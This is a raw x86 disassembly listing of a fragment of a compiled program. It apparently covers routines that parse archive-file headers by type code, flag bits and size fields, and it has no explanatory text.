  401de6:	73 0c                	jae    0x401df4
  401de8:	8b cb                	mov    %ebx,%ecx
  401dea:	e8 95 fe ff ff       	call   0x401c84
  401def:	e9 48 ff ff ff       	jmp    0x401d3c
  401df4:	83 ee 73             	sub    $0x73,%esi
  401df7:	6a 03                	push   $0x3
  401df9:	5f                   	pop    %edi
  401dfa:	74 2b                	je     0x401e27
  401dfc:	4e                   	dec    %esi
  401dfd:	74 1c                	je     0x401e1b
  401dff:	83 ee 06             	sub    $0x6,%esi
  401e02:	74 0f                	je     0x401e13
  401e04:	4e                   	dec    %esi
  401e05:	75 2a                	jne    0x401e31
  401e07:	c7 83 50 65 00 00 05 	movl   $0x5,0x6550(%ebx)
  401e0e:	00 00 00 
  401e11:	eb 1e                	jmp    0x401e31
  401e13:	89 bb 50 65 00 00    	mov    %edi,0x6550(%ebx)
  401e19:	eb 16                	jmp    0x401e31
  401e1b:	c7 83 50 65 00 00 02 	movl   $0x2,0x6550(%ebx)
  401e22:	00 00 00 
  401e25:	eb 0a                	jmp    0x401e31
  401e27:	c7 83 50 65 00 00 01 	movl   $0x1,0x6550(%ebx)
  401e2e:	00 00 00 
  401e31:	8b 8b 50 65 00 00    	mov    0x6550(%ebx),%ecx
  401e37:	89 8b 44 65 00 00    	mov    %ecx,0x6544(%ebx)
  401e3d:	83 f9 75             	cmp    $0x75,%ecx
  401e40:	75 04                	jne    0x401e46
  401e42:	6a 06                	push   $0x6
  401e44:	eb 12                	jmp    0x401e58
  401e46:	83 f9 01             	cmp    $0x1,%ecx
  401e49:	75 09                	jne    0x401e54
  401e4b:	f6 83 54 65 00 00 02 	testb  $0x2,0x6554(%ebx)
  401e52:	75 ee                	jne    0x401e42
  401e54:	83 c0 f9             	add    $0xfffffff9,%eax
  401e57:	50                   	push   %eax
  401e58:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  401e5b:	e8 77 93 00 00       	call   0x40b1d7
  401e60:	ff b3 58 65 00 00    	push   0x6558(%ebx)
  401e66:	8b cb                	mov    %ebx,%ecx
  401e68:	e8 67 f2 ff ff       	call   0x4010d4
  401e6d:	33 c9                	xor    %ecx,%ecx
  401e6f:	03 83 40 b0 00 00    	add    0xb040(%ebx),%eax
  401e75:	13 8b 44 b0 00 00    	adc    0xb044(%ebx),%ecx
  401e7b:	89 83 48 b0 00 00    	mov    %eax,0xb048(%ebx)
  401e81:	8b 83 50 65 00 00    	mov    0x6550(%ebx),%eax
  401e87:	89 8b 4c b0 00 00    	mov    %ecx,0xb04c(%ebx)
  401e8d:	83 f8 01             	cmp    $0x1,%eax
  401e90:	0f 84 d5 06 00 00    	je     0x40256b
  401e96:	0f 8e a5 06 00 00    	jle    0x402541
  401e9c:	3b c7                	cmp    %edi,%eax
  401e9e:	0f 8e 8d 00 00 00    	jle    0x401f31
  401ea4:	83 f8 05             	cmp    $0x5,%eax
  401ea7:	0f 85 94 06 00 00    	jne    0x402541
  401ead:	50                   	push   %eax
  401eae:	8d 83 f0 88 00 00    	lea    0x88f0(%ebx),%eax
  401eb4:	8d bb e8 88 00 00    	lea    0x88e8(%ebx),%edi
  401eba:	59                   	pop    %ecx
  401ebb:	8d b3 4c 65 00 00    	lea    0x654c(%ebx),%esi
  401ec1:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401ec3:	8a 08                	mov    (%eax),%cl
  401ec5:	8b 38                	mov    (%eax),%edi
  401ec7:	80 e1 01             	and    $0x1,%cl
  401eca:	88 8b 04 89 00 00    	mov    %cl,0x8904(%ebx)
  401ed0:	8b cf                	mov    %edi,%ecx
  401ed2:	c1 e9 02             	shr    $0x2,%ecx
  401ed5:	80 e1 01             	and    $0x1,%cl
  401ed8:	88 8b 06 89 00 00    	mov    %cl,0x8906(%ebx)
  401ede:	8b c7                	mov    %edi,%eax
  401ee0:	d1 e8                	shr    $1,%eax
  401ee2:	8b cf                	mov    %edi,%ecx
  401ee4:	c1 e9 03             	shr    $0x3,%ecx
  401ee7:	24 01                	and    $0x1,%al
  401ee9:	80 e1 01             	and    $0x1,%cl
  401eec:	8d b3 07 89 00 00    	lea    0x8907(%ebx),%esi
  401ef2:	88 83 05 89 00 00    	mov    %al,0x8905(%ebx)
  401ef8:	88 0e                	mov    %cl,(%esi)
  401efa:	84 c0                	test   %al,%al
  401efc:	74 0e                	je     0x401f0c
  401efe:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  401f01:	e8 b8 93 00 00       	call   0x40b2be
  401f06:	89 83 fc 88 00 00    	mov    %eax,0x88fc(%ebx)
  401f0c:	80 3e 00             	cmpb   $0x0,(%esi)
  401f0f:	0f 84 10 07 00 00    	je     0x402625
  401f15:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  401f18:	e8 6c 93 00 00       	call   0x40b289
  401f1d:	0f b7 c0             	movzwl %ax,%eax
  401f20:	89 83 00 89 00 00    	mov    %eax,0x8900(%ebx)
  401f26:	89 83 78 b0 00 00    	mov    %eax,0xb078(%ebx)
  401f2c:	e9 f4 06 00 00       	jmp    0x402625
  401f31:	83 f8 02             	cmp    $0x2,%eax
  401f34:	0f 94 45 f3          	sete   -0xd(%ebp)
  401f38:	80 7d f3 00          	cmpb   $0x0,-0xd(%ebp)
  401f3c:	8d 83 e8 65 00 00    	lea    0x65e8(%ebx),%eax
  401f42:	75 06                	jne    0x401f4a
  401f44:	8d 83 28 89 00 00    	lea    0x8928(%ebx),%eax
  401f4a:	8b f8                	mov    %eax,%edi
  401f4c:	6a 00                	push   $0x0
  401f4e:	8b cf                	mov    %edi,%ecx
  401f50:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401f53:	e8 74 79 00 00       	call   0x4098cc
  401f58:	6a 05                	push   $0x5
  401f5a:	59                   	pop    %ecx
  401f5b:	8d b3 4c 65 00 00    	lea    0x654c(%ebx),%esi
  401f61:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401f63:	8b 75 ec             	mov    -0x14(%ebp),%esi
  401f66:	8a 46 08             	mov    0x8(%esi),%al
  401f69:	24 01                	and    $0x1,%al
  401f6b:	88 86 88 10 00 00    	mov    %al,0x1088(%esi)
  401f71:	8b 46 08             	mov    0x8(%esi),%eax
  401f74:	8b c8                	mov    %eax,%ecx
  401f76:	d1 e9                	shr    $1,%ecx
  401f78:	80 e1 01             	and    $0x1,%cl
  401f7b:	88 8e 89 10 00 00    	mov    %cl,0x1089(%esi)
  401f81:	8b c8                	mov    %eax,%ecx
  401f83:	c1 e9 02             	shr    $0x2,%ecx
  401f86:	80 e1 01             	and    $0x1,%cl
  401f89:	88 8e 8b 10 00 00    	mov    %cl,0x108b(%esi)
  401f8f:	8b c8                	mov    %eax,%ecx
  401f91:	c1 e9 0a             	shr    $0xa,%ecx
  401f94:	80 e1 01             	and    $0x1,%cl
  401f97:	80 7d f3 00          	cmpb   $0x0,-0xd(%ebp)
  401f9b:	88 8e 90 10 00 00    	mov    %cl,0x1090(%esi)
  401fa1:	74 09                	je     0x401fac
  401fa3:	a8 10                	test   $0x10,%al
  401fa5:	74 05                	je     0x401fac
  401fa7:	33 c9                	xor    %ecx,%ecx
  401fa9:	41                   	inc    %ecx
  401faa:	eb 02                	jmp    0x401fae
  401fac:	33 c9                	xor    %ecx,%ecx
  401fae:	80 7d f3 00          	cmpb   $0x0,-0xd(%ebp)
  401fb2:	8b 75 ec             	mov    -0x14(%ebp),%esi
  401fb5:	88 8e e0 10 00 00    	mov    %cl,0x10e0(%esi)
  401fbb:	75 09                	jne    0x401fc6
  401fbd:	a8 10                	test   $0x10,%al
  401fbf:	74 05                	je     0x401fc6
  401fc1:	33 c9                	xor    %ecx,%ecx
  401fc3:	41                   	inc    %ecx
  401fc4:	eb 02                	jmp    0x401fc8
  401fc6:	33 c9                	xor    %ecx,%ecx
  401fc8:	88 8e ea 10 00 00    	mov    %cl,0x10ea(%esi)
  401fce:	8b c8                	mov    %eax,%ecx
  401fd0:	81 e1 e0 00 00 00    	and    $0xe0,%ecx
  401fd6:	80 f9 e0             	cmp    $0xe0,%cl
  401fd9:	0f 94 c1             	sete   %cl
  401fdc:	88 8e e1 10 00 00    	mov    %cl,0x10e1(%esi)
  401fe2:	84 c9                	test   %cl,%cl
  401fe4:	74 04                	je     0x401fea
  401fe6:	33 d2                	xor    %edx,%edx
  401fe8:	eb 0f                	jmp    0x401ff9
  401fea:	8b c8                	mov    %eax,%ecx
  401fec:	c1 e9 05             	shr    $0x5,%ecx
  401fef:	83 e1 07             	and    $0x7,%ecx
  401ff2:	ba 00 00 01 00       	mov    $0x10000,%edx
  401ff7:	d3 e2                	shl    %cl,%edx
  401ff9:	8b c8                	mov    %eax,%ecx
  401ffb:	c1 e9 03             	shr    $0x3,%ecx
  401ffe:	80 e1 01             	and    $0x1,%cl
  402001:	c1 e8 0b             	shr    $0xb,%eax
  402004:	88 8e e2 10 00 00    	mov    %cl,0x10e2(%esi)
  40200a:	24 01                	and    $0x1,%al
  40200c:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  40200f:	89 96 e4 10 00 00    	mov    %edx,0x10e4(%esi)
  402015:	88 86 e3 10 00 00    	mov    %al,0x10e3(%esi)
  40201b:	e8 9e 92 00 00       	call   0x40b2be
  402020:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  402023:	89 46 14             	mov    %eax,0x14(%esi)
  402026:	e8 93 92 00 00       	call   0x40b2be
  40202b:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  40202e:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  402031:	e8 3b 92 00 00       	call   0x40b271
  402036:	6a 02                	push   $0x2
  402038:	5f                   	pop    %edi
  402039:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  40203c:	88 46 18             	mov    %al,0x18(%esi)
  40203f:	89 be 60 10 00 00    	mov    %edi,0x1060(%esi)
  402045:	e8 74 92 00 00       	call   0x40b2be
  40204a:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  40204d:	89 86 64 10 00 00    	mov    %eax,0x1064(%esi)
  402053:	e8 66 92 00 00       	call   0x40b2be
  402058:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  40205b:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40205e:	e8 0e 92 00 00       	call   0x40b271
  402063:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  402066:	88 46 19             	mov    %al,0x19(%esi)
  402069:	e8 03 92 00 00       	call   0x40b271
  40206e:	2c 30                	sub    $0x30,%al
  402070:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  402073:	88 46 1a             	mov    %al,0x1a(%esi)
  402076:	e8 0e 92 00 00       	call   0x40b289
  40207b:	0f b7 c0             	movzwl %ax,%eax
  40207e:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  402081:	89 45 ec             	mov    %eax,-0x14(%ebp)
  402084:	e8 35 92 00 00       	call   0x40b2be
  402089:	83 a6 8c 10 00 00 00 	andl   $0x0,0x108c(%esi)
  402090:	80 be 8b 10 00 00 00 	cmpb   $0x0,0x108b(%esi)
  402097:	89 46 1c             	mov    %eax,0x1c(%esi)
  40209a:	74 41                	je     0x4020dd
  40209c:	0f b6 4e 19          	movzbl 0x19(%esi),%ecx
  4020a0:	83 e9 0d             	sub    $0xd,%ecx
  4020a3:	74 2e                	je     0x4020d3
  4020a5:	2b cf                	sub    %edi,%ecx
  4020a7:	74 22                	je     0x4020cb
  4020a9:	83 e9 05             	sub    $0x5,%ecx
  4020ac:	74 11                	je     0x4020bf
  4020ae:	83 e9 06             	sub    $0x6,%ecx
  4020b1:	74 0c                	je     0x4020bf
  4020b3:	c7 86 8c 10 00 00 04 	movl   $0x4,0x108c(%esi)
  4020ba:	00 00 00 
  4020bd:	eb 1e                	jmp    0x4020dd
  4020bf:	c7 86 8c 10 00 00 03 	movl   $0x3,0x108c(%esi)
  4020c6:	00 00 00 
  4020c9:	eb 12                	jmp    0x4020dd
  4020cb:	89 be 8c 10 00 00    	mov    %edi,0x108c(%esi)
  4020d1:	eb 0a                	jmp    0x4020dd
  4020d3:	c7 86 8c 10 00 00 01 	movl   $0x1,0x108c(%esi)
  4020da:	00 00 00 
  4020dd:	8a 56 18             	mov    0x18(%esi),%dl
  4020e0:	89 be ec 10 00 00    	mov    %edi,0x10ec(%esi)
  4020e6:	80 fa 03             	cmp    $0x3,%dl
  4020e9:	74 13                	je     0x4020fe
  4020eb:	80 fa 05             	cmp    $0x5,%dl
  4020ee:	74 0e                	je     0x4020fe
  4020f0:	80 fa 06             	cmp    $0x6,%dl
  4020f3:	73 13                	jae    0x402108
  4020f5:	83 a6 ec 10 00 00 00 	andl   $0x0,0x10ec(%esi)
  4020fc:	eb 0a                	jmp    0x402108
  4020fe:	c7 86 ec 10 00 00 01 	movl   $0x1,0x10ec(%esi)
  402105:	00 00 00 
  402108:	33 ff                	xor    %edi,%edi
  40210a:	8d 8e f0 10 00 00    	lea    0x10f0(%esi),%ecx
  402110:	89 39                	mov    %edi,(%ecx)
  402112:	80 fa 03             	cmp    $0x3,%dl
  402115:	75 1f                	jne    0x402136
  402117:	8b d0                	mov    %eax,%edx
  402119:	81 e2 00 f0 00 00    	and    $0xf000,%edx
  40211f:	81 fa 00 a0 00 00    	cmp    $0xa000,%edx
  402125:	75 0f                	jne    0x402136
  402127:	c7 01 01 00 00 00    	movl   $0x1,(%ecx)
  40212d:	33 c9                	xor    %ecx,%ecx
  40212f:	66 89 8e f4 10 00 00 	mov    %cx,0x10f4(%esi)
  402136:	80 7d f3 00          	cmpb   $0x0,-0xd(%ebp)
  40213a:	75 09                	jne    0x402145
  40213c:	85 c0                	test   %eax,%eax
  40213e:	79 05                	jns    0x402145
  402140:	33 c0                	xor    %eax,%eax
  402142:	40                   	inc    %eax
  402143:	eb 02                	jmp    0x402147
  402145:	33 c0                	xor    %eax,%eax
  402147:	88 86 e8 10 00 00    	mov    %al,0x10e8(%esi)
  40214d:	8b 46 08             	mov    0x8(%esi),%eax
  402150:	c1 e8 08             	shr    $0x8,%eax
  402153:	24 01                	and    $0x1,%al
  402155:	88 86 e9 10 00 00    	mov    %al,0x10e9(%esi)
  40215b:	74 29                	je     0x402186
  40215d:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  402160:	e8 59 91 00 00       	call   0x40b2be
  402165:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  402168:	8b f8                	mov    %eax,%edi
  40216a:	e8 4f 91 00 00       	call   0x40b2be
  40216f:	83 7d e4 ff          	cmpl   $0xffffffff,-0x1c(%ebp)
  402173:	89 45 e8             	mov    %eax,-0x18(%ebp)
  402176:	75 0a                	jne    0x402182
  402178:	83 f8 ff             	cmp    $0xffffffff,%eax
  40217b:	75 05                	jne    0x402182
  40217d:	33 c0                	xor    %eax,%eax
  40217f:	40                   	inc    %eax
  402180:	eb 0e                	jmp    0x402190
  402182:	33 c0                	xor    %eax,%eax
  402184:	eb 0a                	jmp    0x402190
  402186:	83 7d e4 ff          	cmpl   $0xffffffff,-0x1c(%ebp)
  40218a:	89 7d e8             	mov    %edi,-0x18(%ebp)
  40218d:	0f 94 c0             	sete   %al
  402190:	6a 01                	push   $0x1
  402192:	6a 00                	push   $0x0
  402194:	6a 00                	push   $0x0
  402196:	57                   	push   %edi
  402197:	88 86 8a 10 00 00    	mov    %al,0x108a(%esi)
  40219d:	e8 ae 85 01 00       	call   0x41a750
  4021a2:	8b 4e 14             	mov    0x14(%esi),%ecx
  4021a5:	33 ff                	xor    %edi,%edi
  4021a7:	6a 01                	push   $0x1
  4021a9:	57                   	push   %edi
  4021aa:	03 c1                	add    %ecx,%eax
  4021ac:	57                   	push   %edi
  4021ad:	ff 75 e8             	push   -0x18(%ebp)
  4021b0:	13 d7                	adc    %edi,%edx
  4021b2:	89 86 48 10 00 00    	mov    %eax,0x1048(%esi)
  4021b8:	89 96 4c 10 00 00    	mov    %edx,0x104c(%esi)
  4021be:	e8 8d 85 01 00       	call   0x41a750
  4021c3:	33 c9                	xor    %ecx,%ecx
  4021c5:	03 45 e4             	add    -0x1c(%ebp),%eax
  4021c8:	13 d1                	adc    %ecx,%edx
  4021ca:	89 86 50 10 00 00    	mov    %eax,0x1050(%esi)
  4021d0:	89 96 54 10 00 00    	mov    %edx,0x1054(%esi)
  4021d6:	38 8e 8a 10 00 00    	cmp    %cl,0x108a(%esi)
  4021dc:	74 11                	je     0x4021ef
  4021de:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  4021e3:	89 86 50 10 00 00    	mov    %eax,0x1050(%esi)
  4021e9:	89 86 54 10 00 00    	mov    %eax,0x1054(%esi)
  4021ef:	bf ff 1f 00 00       	mov    $0x1fff,%edi
  4021f4:	39 7d ec             	cmp    %edi,-0x14(%ebp)
  4021f7:	73 03                	jae    0x4021fc
  4021f9:	8b 7d ec             	mov    -0x14(%ebp),%edi
  4021fc:	57                   	push   %edi
  4021fd:	8d 85 80 d7 ff ff    	lea    -0x2880(%ebp),%eax
  402203:	50                   	push   %eax
  402204:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  402207:	e8 99 91 00 00       	call   0x40b3a5
  40220c:	80 7d f3 00          	cmpb   $0x0,-0xd(%ebp)
  402210:	c6 84 3d 80 d7 ff ff 	movb   $0x0,-0x2880(%ebp,%edi,1)
  402217:	00 
  402218:	0f 84 8a 00 00 00    	je     0x4022a8
  40221e:	f7 46 08 00 02 00 00 	testl  $0x200,0x8(%esi)
  402225:	bf 00 08 00 00       	mov    $0x800,%edi
  40222a:	74 3d                	je     0x402269
  40222c:	8d 4d a4             	lea    -0x5c(%ebp),%ecx
  40222f:	e8 97 3e 00 00       	call   0x4060cb
  402234:	8d 85 80 d7 ff ff    	lea    -0x2880(%ebp),%eax
  40223a:	50                   	push   %eax
  40223b:	e8 a0 83 01 00       	call   0x41a5e0
  402240:	59                   	pop    %ecx
  402241:	57                   	push   %edi
  402242:	8d 4e 20             	lea    0x20(%esi),%ecx
  402245:	51                   	push   %ecx
  402246:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  402249:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40224c:	40                   	inc    %eax
  40224d:	2b c8                	sub    %eax,%ecx
  40224f:	51                   	push   %ecx
  402250:	8d 84 05 80 d7 ff ff 	lea    -0x2880(%ebp,%eax,1),%eax
  402257:	50                   	push   %eax
  402258:	8d 85 80 d7 ff ff    	lea    -0x2880(%ebp),%eax
  40225e:	50                   	push   %eax
  40225f:	8d 4d a4             	lea    -0x5c(%ebp),%ecx
  402262:	e8 75 3e 00 00       	call   0x4060dc
  402267:	eb 0b                	jmp    0x402274
  402269:	8d 46 20             	lea    0x20(%esi),%eax
  40226c:	33 c9                	xor    %ecx,%ecx
  40226e:	89 45 e8             	mov    %eax,-0x18(%ebp)
  402271:	66 89 08             	mov    %cx,(%eax)
  402274:	57                   	push   %edi
  402275:	8d 85 80 f7 ff ff    	lea    -0x880(%ebp),%eax
  40227b:	50                   	push   %eax
  40227c:	8d 85 80 d7 ff ff    	lea    -0x2880(%ebp),%eax
  402282:	50                   	push   %eax
  402283:	e8 a0 e4 00 00       	call   0x410728
  402288:	57                   	push   %edi
  402289:	ff 75 e8             	push   -0x18(%ebp)
  40228c:	8d 85 80 f7 ff ff    	lea    -0x880(%ebp),%eax
  402292:	ff 75 e8             	push   -0x18(%ebp)
  402295:	50                   	push   %eax
  402296:	e8 17 7e 00 00       	call   0x40a0b2
  40229b:	56                   	push   %esi
  40229c:	8b cb                	mov    %ebx,%ecx
  40229e:	e8 0a f8 ff ff       	call   0x401aad
  4022a3:	e9 2c 01 00 00       	jmp    0x4023d4
  4022a8:	8d 46 20             	lea    0x20(%esi),%eax
  4022ab:	68 00 08 00 00       	push   $0x800
  4022b0:	50                   	push   %eax
  4022b1:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4022b4:	8d 85 80 d7 ff ff    	lea    -0x2880(%ebp),%eax
  4022ba:	50                   	push   %eax
  4022bb:	e8 02 f4 00 00       	call   0x4116c2
  4022c0:	8b 7e 0c             	mov    0xc(%esi),%edi
  4022c3:	2b 7d ec             	sub    -0x14(%ebp),%edi
  4022c6:	83 ef 20             	sub    $0x20,%edi
  4022c9:	f7 46 08 00 04 00 00 	testl  $0x400,0x8(%esi)
  4022d0:	74 03                	je     0x4022d5
  4022d2:	83 ef 08             	sub    $0x8,%edi
  4022d5:	85 ff                	test   %edi,%edi
  4022d7:	0f 8e dd 00 00 00    	jle    0x4023ba
  4022dd:	8d 8e 20 10 00 00    	lea    0x1020(%esi),%ecx
  4022e3:	57                   	push   %edi
  4022e4:	e8 38 f9 ff ff       	call   0x401c21
  4022e9:	57                   	push   %edi
  4022ea:	ff b6 20 10 00 00    	push   0x1020(%esi)
  4022f0:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  4022f3:	e8 ad 90 00 00       	call   0x40b3a5
  4022f8:	68 84 a4 42 00       	push   $0x42a484
  4022fd:	ff 75 e8             	push   -0x18(%ebp)
  402300:	e8 9c 82 01 00       	call   0x41a5a1
  402305:	59                   	pop    %ecx
  402306:	59                   	pop    %ecx
  402307:	85 c0                	test   %eax,%eax
  402309:	0f 85 ab 00 00 00    	jne    0x4023ba
  40230f:	8b 86 20 10 00 00    	mov    0x1020(%esi),%eax
  402315:	0f b6 48 0b          	movzbl 0xb(%eax),%ecx
  402319:	0f b6 50 0a          	movzbl 0xa(%eax),%edx
  40231d:	83 c0 08             	add    $0x8,%eax
  402320:	c1 e1 08             	shl    $0x8,%ecx
  402323:	03 ca                	add    %edx,%ecx
  402325:	0f b6 50 01          	movzbl 0x1(%eax),%edx
  402329:	0f b6 00             	movzbl (%eax),%eax
  40232c:	83 a3 2c 65 00 00 00 	andl   $0x0,0x652c(%ebx)
  402333:	c1 e1 08             	shl    $0x8,%ecx
  402336:	6a 00                	push   $0x0
  402338:	03 ca                	add    %edx,%ecx
  40233a:	68 00 02 00 00       	push   $0x200
  40233f:	ff b3 2c 65 00 00    	push   0x652c(%ebx)
  402345:	c1 e1 08             	shl    $0x8,%ecx
  402348:	03 c8                	add    %eax,%ecx
  40234a:	51                   	push   %ecx
  40234b:	e8 00 84 01 00       	call   0x41a750
  402350:	89 83 28 65 00 00    	mov    %eax,0x6528(%ebx)
  402356:	8b 03                	mov    (%ebx),%eax
  402358:	8b cb                	mov    %ebx,%ecx
  40235a:	89 93 2c 65 00 00    	mov    %edx,0x652c(%ebx)
  402360:	ff 50 10             	call   *0x10(%eax)
  402363:	52                   	push   %edx
  402364:	50                   	push   %eax
  402365:	ff b3 2c 65 00 00    	push   0x652c(%ebx)
  40236b:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40236e:	ff b3 28 65 00 00    	push   0x6528(%ebx)
  402374:	89 55 dc             	mov    %edx,-0x24(%ebp)
  402377:	e8 81 e3 00 00       	call   0x4106fd
  40237c:	ff 75 dc             	push   -0x24(%ebp)
  40237f:	89 83 30 65 00 00    	mov    %eax,0x6530(%ebx)
  402385:	ff 75 d8             	push   -0x28(%ebp)
  402388:	8b f8                	mov    %eax,%edi
  40238a:	6a 00                	push   $0x0
  40238c:	68 c8 00 00 00       	push   $0xc8
  402391:	ff 75 dc             	push   -0x24(%ebp)
  402394:	ff 75 d8             	push   -0x28(%ebp)
  402397:	e8 04 83 01 00       	call   0x41a6a0
  40239c:	03 83 28 65 00 00    	add    0x6528(%ebx),%eax
  4023a2:	13 93 2c 65 00 00    	adc    0x652c(%ebx),%edx
  4023a8:	52                   	push   %edx
  4023a9:	50                   	push   %eax
  4023aa:	e8 4e e3 00 00       	call   0x4106fd
  4023af:	3b c7                	cmp    %edi,%eax
  4023b1:	7e 07                	jle    0x4023ba
  4023b3:	47                   	inc    %edi
  4023b4:	89 bb 30 65 00 00    	mov    %edi,0x6530(%ebx)
  4023ba:	68 7c a4 42 00       	push   $0x42a47c
  4023bf:	ff 75 e8             	push   -0x18(%ebp)
  4023c2:	e8 da 81 01 00       	call   0x41a5a1
  4023c7:	59                   	pop    %ecx
  4023c8:	59                   	pop    %ecx
  4023c9:	85 c0                	test   %eax,%eax
  4023cb:	75 07                	jne    0x4023d4
  4023cd:	c6 83 56 b0 00 00 01 	movb   $0x1,0xb056(%ebx)
  4023d4:	f7 46 08 00 04 00 00 	testl  $0x400,0x8(%esi)
  4023db:	74 11                	je     0x4023ee
  4023dd:	6a 08                	push   $0x8
  4023df:	8d 86 91 10 00 00    	lea    0x1091(%esi),%eax
  4023e5:	50                   	push   %eax
  4023e6:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  4023e9:	e8 b7 8f 00 00       	call   0x40b3a5
  4023ee:	ff 75 e0             	push   -0x20(%ebp)
  4023f1:	8d 8e 30 10 00 00    	lea    0x1030(%esi),%ecx
  4023f7:	e8 06 ee 00 00       	call   0x411202
  4023fc:	f7 46 08 00 10 00 00 	testl  $0x1000,0x8(%esi)
  402403:	0f 84 d1 00 00 00    	je     0x4024da
  402409:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  40240c:	e8 78 8e 00 00       	call   0x40b289
  402411:	83 65 b4 00          	andl   $0x0,-0x4c(%ebp)
  402415:	83 65 ec 00          	andl   $0x0,-0x14(%ebp)
  402419:	8d 8b 18 76 00 00    	lea    0x7618(%ebx),%ecx
  40241f:	0f b7 c0             	movzwl %ax,%eax
  402422:	89 4d a8             	mov    %ecx,-0x58(%ebp)
  402425:	8d 8b 20 76 00 00    	lea    0x7620(%ebx),%ecx
  40242b:	0f b7 c0             	movzwl %ax,%eax
  40242e:	89 4d ac             	mov    %ecx,-0x54(%ebp)
  402431:	8d 8b 28 76 00 00    	lea    0x7628(%ebx),%ecx
  402437:	89 4d b0             	mov    %ecx,-0x50(%ebp)
  40243a:	89 45 dc             	mov    %eax,-0x24(%ebp)
  40243d:	c7 45 e4 0c 00 00 00 	movl   $0xc,-0x1c(%ebp)
  402444:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402447:	8b 7c 85 a8          	mov    -0x58(%ebp,%eax,4),%edi
  40244b:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40244e:	8a 4d e4             	mov    -0x1c(%ebp),%cl
  402451:	d3 e8                	shr    %cl,%eax
  402453:	89 45 e0             	mov    %eax,-0x20(%ebp)
  402456:	a8 08                	test   $0x8,%al
  402458:	74 6f                	je     0x4024c9
  40245a:	85 ff                	test   %edi,%edi
  40245c:	74 6b                	je     0x4024c9
  40245e:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  402462:	74 10                	je     0x402474
  402464:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  402467:	e8 52 8e 00 00       	call   0x40b2be
  40246c:	50                   	push   %eax
  40246d:	8b cf                	mov    %edi,%ecx
  40246f:	e8 8e ed 00 00       	call   0x411202
  402474:	8d 45 80             	lea    -0x80(%ebp),%eax
  402477:	50                   	push   %eax
  402478:	8b cf                	mov    %edi,%ecx
  40247a:	e8 24 eb 00 00       	call   0x410fa3
  40247f:	f6 45 e0 04          	testb  $0x4,-0x20(%ebp)
  402483:	74 03                	je     0x402488
  402485:	ff 45 94             	incl   -0x6c(%ebp)
  402488:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40248b:	83 65 98 00          	andl   $0x0,-0x68(%ebp)
  40248f:	83 e0 03             	and    $0x3,%eax
  402492:	7e 25                	jle    0x4024b9
  402494:	6a 03                	push   $0x3
  402496:	5f                   	pop    %edi
  402497:	2b f8                	sub    %eax,%edi
  402499:	c1 e7 03             	shl    $0x3,%edi
  40249c:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40249f:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  4024a2:	e8 ca 8d 00 00       	call   0x40b271
  4024a7:	0f b6 c0             	movzbl %al,%eax
  4024aa:	8b cf                	mov    %edi,%ecx
  4024ac:	d3 e0                	shl    %cl,%eax
  4024ae:	83 c7 08             	add    $0x8,%edi
  4024b1:	09 45 98             	or     %eax,-0x68(%ebp)
  4024b4:	ff 4d e0             	decl   -0x20(%ebp)
  4024b7:	75 e6                	jne    0x40249f
  4024b9:	8d 45 80             	lea    -0x80(%ebp),%eax
  4024bc:	50                   	push   %eax
  4024bd:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4024c0:	8b 4c 85 a8          	mov    -0x58(%ebp,%eax,4),%ecx
  4024c4:	e8 2a ec 00 00       	call   0x4110f3
  4024c9:	83 6d e4 04          	subl   $0x4,-0x1c(%ebp)
  4024cd:	ff 45 ec             	incl   -0x14(%ebp)
  4024d0:	83 7d e4 fc          	cmpl   $0xfffffffc,-0x1c(%ebp)
  4024d4:	0f 8f 6a ff ff ff    	jg     0x402444
  4024da:	8b 86 48 10 00 00    	mov    0x1048(%esi),%eax
  4024e0:	01 83 48 b0 00 00    	add    %eax,0xb048(%ebx)
  4024e6:	8b 86 4c 10 00 00    	mov    0x104c(%esi),%eax
  4024ec:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  4024ef:	11 83 4c b0 00 00    	adc    %eax,0xb04c(%ebx)
  4024f5:	8a 86 e2 10 00 00    	mov    0x10e2(%esi),%al
  4024fb:	88 45 dc             	mov    %al,-0x24(%ebp)
  4024fe:	ff 75 dc             	push   -0x24(%ebp)
  402501:	e8 ef 8e 00 00       	call   0x40b3f5
  402506:	0f b7 c0             	movzwl %ax,%eax
  402509:	39 06                	cmp    %eax,(%esi)
  40250b:	0f 84 14 01 00 00    	je     0x402625
  402511:	6a 01                	push   $0x1
  402513:	b9 ac 25 43 00       	mov    $0x4325ac,%ecx
  402518:	c6 83 64 b0 00 00 01 	movb   $0x1,0xb064(%ebx)
  40251f:	e8 33 3d 00 00       	call   0x406257
  402524:	80 7d f2 00          	cmpb   $0x0,-0xe(%ebp)
  402528:	0f 85 f7 00 00 00    	jne    0x402625
